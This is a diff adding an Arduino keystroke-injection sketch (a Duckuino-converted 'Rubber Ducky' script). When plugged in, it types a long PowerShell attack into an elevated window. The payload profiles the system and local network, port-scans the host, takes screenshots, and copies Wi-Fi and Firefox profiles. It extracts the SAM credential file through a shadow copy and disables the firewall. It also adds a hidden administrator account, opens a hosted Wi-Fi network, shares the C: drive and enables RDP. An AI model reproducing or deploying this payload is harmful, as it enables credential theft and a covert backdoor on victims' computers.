@@ -1,0 +1,1206 @@
+#include "Keyboard.h"
+#include "Mouse.h"
+
+#define blinkInterval 50
+#define ledPin 3
+#define buttonPin 6
+
+int defaultDelay = 4;
+int defaultCharDelay = 5;
+int rMin = 0;
+int rMax = 100;
+
+bool ledOn = true;
+
+void typeKey(int key){
+  Keyboard.press(key);
+  delay(defaultCharDelay);
+  Keyboard.release(key);
+}
+
+void setup(){
+  
+  pinMode(buttonPin, INPUT_PULLUP);
+  pinMode(ledPin, OUTPUT);
+  digitalWrite(ledPin, HIGH);
+  
+  if(digitalRead(buttonPin) == LOW){
+    
+    Keyboard.begin();
+    Mouse.begin();
+    
+    /* ----- Begin-Script -----*/
+    
+    /* [Parsed By Duckuino (Licensed under MIT) - for more information visit: https://github.com/Nurrl/Dckuino.js] */    
+    delay(750);
+
+    delay(defaultDelay);
+    Keyboard.press(KEY_LEFT_GUI);
+    Keyboard.press(114);
+    Keyboard.releaseAll();
+
+    delay(defaultDelay);
+    delay(1000);
+
+    delay(defaultDelay);
+    Keyboard.print("powershell Start-Process notepad -Verb runAs");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    delay(750);
+
+    delay(defaultDelay);
+    Keyboard.press(KEY_LEFT_ALT);
+    Keyboard.press(121);
+    Keyboard.releaseAll();
+
+    delay(defaultDelay);
+    delay(750);
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.press(KEY_LEFT_ALT);
+    Keyboard.press(' ');
+    Keyboard.releaseAll();
+
+    delay(defaultDelay);
+    delay(1000);
+
+    delay(defaultDelay);
+    Keyboard.print("m");
+
+    delay(defaultDelay);
+    delay(1000);
+
+    delay(defaultDelay);
+    typeKey(KEY_DOWN_ARROW);
+    for(int i = 0; i < 100; i++) {
+      typeKey(KEY_DOWN_ARROW);
+    }
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$folderDateTime = (get-date).ToString('d-M-y HHmmss')");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$userDir = (Get-ChildItem env:\\userprofile).value + '\\Ducky Report ' + $folderDateTime");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$fileSaveDir = New-Item  ($userDir) -ItemType Directory");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$date = get-date");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$style = \"<style> table td{padding-right: 10px;text-align: left;}#body {padding:50px;font-family: Helvetica; font-size: 12pt; border: 10px solid black;background-color:white;height:100%;overflow:auto;}#left{float:left; background-color:#C0C0C0;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#right{background-color:#C0C0C0;float:right;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#center{background-color:#C0C0C0;width:98%;height:300px;border: 4px solid black;padding:10px;overflow:scroll;margin:10px;} </style>\"");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Report = ConvertTo-Html -Title 'Recon Report' -Head $style > $fileSaveDir'/ComputerInfo.html'");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Report = $Report + \"<div id=body><h1>Duck Tool Kit Report</h1><hr size=2><br><h3> Generated on: $Date </h3><br>\"");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$SysBootTime = Get-WmiObject Win32_OperatingSystem");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$BootTime = $SysBootTime.ConvertToDateTime($SysBootTime.LastBootUpTime)| ConvertTo-Html datetime");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$SysSerialNo = (Get-WmiObject -Class Win32_OperatingSystem -ComputerName $env:COMPUTERNAME)");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$SerialNo = $SysSerialNo.SerialNumber");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$SysInfo = Get-WmiObject -class Win32_ComputerSystem -namespace root/CIMV2 | Select Manufacturer,Model");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$SysManufacturer = $SysInfo.Manufacturer");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$SysModel = $SysInfo.Model");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$OS = (Get-WmiObject Win32_OperatingSystem -computername $env:COMPUTERNAME ).caption");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$disk = Get-WmiObject Win32_LogicalDisk -Filter \"DeviceID='C:'\"");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$HD = [math]::truncate($disk.Size / 1GB)");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$FreeSpace = [math]::truncate($disk.FreeSpace / 1GB)");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$SysRam = Get-WmiObject -Class Win32_OperatingSystem -computername $env:COMPUTERNAME | Select  TotalVisibleMemorySize");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Ram = [Math]::Round($SysRam.TotalVisibleMemorySize/1024KB)");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$SysCpu = Get-WmiObject Win32_Processor | Select Name");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Cpu = $SysCpu.Name");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$HardSerial = Get-WMIObject Win32_BIOS -Computer $env:COMPUTERNAME | select SerialNumber");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$HardSerialNo = $HardSerial.SerialNumber");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$SysCdDrive = Get-WmiObject Win32_CDROMDrive |select Name");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$graphicsCard = gwmi win32_VideoController |select Name");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$graphics = $graphicsCard.Name");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$SysCdDrive = Get-WmiObject Win32_CDROMDrive |select -first 1");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$DriveLetter = $CDDrive.Drive");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$DriveName = $CDDrive.Caption");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Disk = $DriveLetter + '\\' + $DriveName");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Firewall = New-Object -com HNetCfg.FwMgr");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$FireProfile = $Firewall.LocalPolicy.CurrentProfile");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$FireProfile = $FireProfile.FirewallEnabled");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Report = $Report  + \"<div id=left><h3>Computer Information</h3><br><table><tr><td>Operating System</td><td>$OS</td></tr><tr><td>OS Serial Number:</td><td>$SerialNo</td></tr><tr><td>Current User:</td><td>$env:USERNAME </td></tr><tr><td>System Uptime:</td><td>$BootTime</td></tr><tr><td>System Manufacturer:</td><td>$SysManufacturer</td></tr><tr><td>System Model:</td><td>$SysModel</td></tr><tr><td>Serial Number:</td><td>$HardSerialNo</td></tr><tr><td>Firewall is Active:</td><td>$FireProfile</td></tr></table></div><div id=right><h3>Hardware Information</h3><table><tr><td>Hardrive Size:</td><td>$HD GB</td></tr><tr><td>Hardrive Free Space:</td><td>$FreeSpace GB</td></tr><tr><td>System RAM:</td><td>$Ram GB</td></tr><tr><td>Processor:</td><td>$Cpu</td></tr><td>CD Drive:</td><td>$Disk</td></tr><tr><td>Graphics Card:</td><td>$graphics</td></tr></table></div>\"");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print(" $u = 0");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$allUsb = @(get-wmiobject win32_volume | select Name, Label, FreeSpace)");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Report =  $Report + '<div id=right><h3>USB Devices</h3><table>'");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("do {");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$gbUSB = [math]::truncate($allUsb[$u].FreeSpace / 1GB)");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Report = $Report + \"<tr><td>Drive Name: </td><td> \" + $allUsb[$u].Name + $allUsb[$u].Label + \"</td><td>Free Space: </td><td>\" + $gbUSB + \"GB</td></tr>\"");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("Write-Output $fullUSB");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$u ++");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("} while ($u -lt $allUsb.Count)");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Report = $Report + '</table></div>'");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$UserInfo = Get-WmiObject -class Win32_UserAccount -namespace root/CIMV2 | Where-Object {$_.Name -eq $env:UserName}| Select AccountType,SID,PasswordRequired");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$UserType = $UserInfo.AccountType");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$UserSid = $UserInfo.SID");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$UserPass = $UserInfo.PasswordRequired");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Report =  $Report + \"<div id=left><h3>User Information</h3><br><table><tr><td>Current User Name:</td><td>$env:USERNAME</td></tr><tr><td>Account Type:</td><td> $UserType</td></tr><tr><td>User SID:</td><td>$UserSid</td></tr><tr><td>Account Domain:</td><td>$env:USERDOMAIN</td></tr><tr><td>Password Required:</td><td>$UserPass</td></tr><tr><td>Current User is Admin:</td><td>$IsAdmin</td></tr></table>\"");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Report = $Report + '</div>'");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Report =  $Report + '<div id=left><h3>Shared Drives/Devices</h3>'");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Report =  $Report + (GET-WMIOBJECT Win32_Share | convertto-html Name, Description, Path)");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Report = $Report + '</div>'");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Report =  $Report + '<div id=center><h3> Installed Programs</h3> '");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Report =  $Report + (Get-WmiObject -class Win32_Product | ConvertTo-html  Name, Version,InstallDate)");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Report = $Report + '</table></div>'");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Report =  $Report + '<div id=center><h3> Installed Updates</h3>'");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Report =  $Report +  (Get-WmiObject Win32_QuickFixEngineering -ComputerName $env:COMPUTERNAME | sort-object -property installedon -Descending | ConvertTo-Html   Description, HotFixId,Installedon,InstalledBy)");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Report = $Report + '</div>'");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Report =  $Report + '<div id=center><h3>User Documents (doc,docx,pdf,rar)</h3>'");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Report =  $Report + (Get-ChildItem -Path $userDir -Include *.doc, *.docx, *.pdf, *.zip, *.rar -Recurse |convertto-html Directory, Name, LastAccessTime)");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Report = $Report + '</div>'");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Report =  $Report + '<div id=center><h3>Network Information</h3>'");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Report =  $Report + (Get-WmiObject Win32_NetworkAdapterConfiguration -filter 'IPEnabled= True' | Select Description,DNSHostname, @{Name='IP Address ';Expression={$_.IPAddress}}, MACAddress | ConvertTo-Html)");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Report = $Report + '</table></div>'");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$IP = Get-WmiObject Win32_NetworkAdapterConfiguration -Filter 'IPEnabled = True' | Select IPAddress -First 1");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$IPAddr = $IP.IPAddress | Select-Object -Index 0");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$IPAddr -as [String]");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$IPa = $IPAddr.Split('.') | Select -Index 0");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$IPb = $IPAddr.Split('.') | Select -Index 1");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$IPc = $IPAddr.Split('.') | Select -Index 2");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$IPAddr = $IPa + '.' + $IPb + '.' + $IPc + '.'");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Ping = new-object System.Net.Networkinformation.Ping");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$ScanResults = 1-999..1-999 | ForEach-Object {($Ping).Send($IpAddr + $_) } | Where-Object {$_.Status -eq 'Success'} | select Address");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$x = 0");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Report = $Report  + '<div id=center><h3>Network Scan Results</h3><table>'");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("do {");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$IPResults = $ScanResults |  Select-Object -Index $x");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$CompInfo = Get-WmiObject Win32_OperatingSystem -Computer $IPResults.Address | Select RegisteredUser, SystemDirectory");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$CompName = (Get-WmiObject Win32_OperatingSystem -Computer $IPResults.Address).csname");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$CurrOS = $CompInfo.SystemDirectory");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$CurrName = $CompInfo.RegisteredUser");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("if ($CompInfo -ne $null){");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Report = $Report  + '<tr><td><b>IP Address:</b></td><td>' + $CurrIP + '</td><td><b>Compter Name: </b></td><td>' + $CompName + '</td><td><b>User Name: </b></td><td>' + $CurrName + '</td> <td><b>OS:</b> </td><td>' + $CurrOS + '</td></tr><br>'");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("}else{");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Report = $Report  + '<tr><td><b>IP Address: </b></td><td>' + $CurrIP + '</td><td><b>Computer Name: </b></td><td>NOT KNOWN</td><td><b>User Name: </b></td><td>NOT KNOWN</td><td><b>OS:</b></td><td>NOT KNOWN</td></tr><br>'}");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$x ++");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("} while ($x -lt $ScanResults.Count)");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Report = $Report + '</table></div>'");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Computer = $env:COMPUTERNAME");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$PortList = 0, 21, 22, 23, 25, 79, 80, 110, 113, 119, 135, 137, 139, 143, 389, 443, 445, 1002, 1024, 1030, 1720, 1900, 5000, 8080");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Report = $Report  + '<div id=right><h3>Port Scan of ' + $Computer + '</h3><table>'");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("foreach ($PortNumber in $PortList) {");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$PortCheck = New-Object Net.Sockets.TcpClient");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$PortCheck.Connect($Computer, $PortNumber)");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("if ($PortCheck.Connected) {");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Report = $Report  +  '<tr><td><b><font color=red>Port ' + $PortNumber + ' is open</font></b></td></tr>'}");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("else {$Report = $Report  +  '<tr><td>Port ' + $PortNumber + ' is closed</td></tr>'}}");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Report = $Report + '</table></div>'");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$wlanSaveDir = New-Item $userDir'\\Duck\\WLAN_PROFILES' -ItemType Directory");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$srcDir = 'C:\\ProgramData\\Microsoft\\Wlansvc\\Profiles\\Interfaces'");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("Copy-Item $srcDir $wlanSaveDir -Recurse");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$jpegSaveDir = New-Item $fileSaveDir'\\Screenshots' -ItemType Directory");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$x = 0");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("do { Start-Sleep -Seconds 60");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$jpegName = (get-date).ToString('HHmmss')");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$File = \"$jpegSaveDir\\$jpegName.bmp\"");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("Add-Type -AssemblyName System.Windows.Forms");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("Add-type -AssemblyName System.Drawing");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Width = $Screen.Width");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Height = $Screen.Height");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Left = $Screen.Left");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Top = $Screen.Top");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$bitmap = New-Object System.Drawing.Bitmap $Width, $Height");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$graphic = [System.Drawing.Graphics]::FromImage($bitmap)");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$bitmap.Save($File)");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$x++  } while ($x -ne 3);");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$fireSaveDir = New-Item $userDir'\\Duck\\FireFox-Profile' -ItemType Directory");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$fireDir = (Get-ChildItem env:userprofile).value + '\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles'");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$getFire = Get-Item -Path $fireDir -Exclude extensions");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("Copy-Item $getFire $fireSaveDir -Recurse");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("Start-Sleep -s 10");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$createShadow = (gwmi -List Win32_ShadowCopy).Create('C:\\', 'ClientAccessible')");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$shadow = gwmi Win32_ShadowCopy | ? { $_.ID -eq $createShadow.ShadowID }");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$addSlash  = $shadow.DeviceObject + '\\'");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("cmd /c mklink C:\\shadowcopy $addSlash");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("Copy-Item 'C:\\shadowcopy\\Windows\\System32\\config\\SAM' $fileSaveDir");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("Remove-Item -recurse -force 'C:\\shadowcopy'");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("netsh advfirewall set allprofiles state off");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("Net User Ducky  password  /ADD");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("Net LocalGroup Administrators Ducky   /ADD");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    delay(500);
+
+    delay(defaultDelay);
+    Keyboard.print("reg add 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon\\SpecialAccounts\\UserList' /v Ducky  /t REG_DWORD /d 0 /f");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("netsh advfirewall firewall add rule name=bad_bi*ch dir=in action=allow protocol=Tcp  localport=8080");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("netsh wlan set hostednetwork ssid=duckywifi  key=12345678");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("netsh wlan start hostednetwork");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Share = [WmiClass]'Win32_Share'");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("$Share.Create('C:\\', 'netShare', 0)");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("netsh advfirewall firewall set rule group=\\\"File and Printer Sharing\\\" new enable=Yes");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server' -Name fDenyTSConnections -Value 0");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
+    delay(defaultDelay);
+    Keyboard.print("Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -Name UserAuthentication -Value 1");
+
+    delay(defaultDelay);
+    typeKey(KEY_RETURN);
+
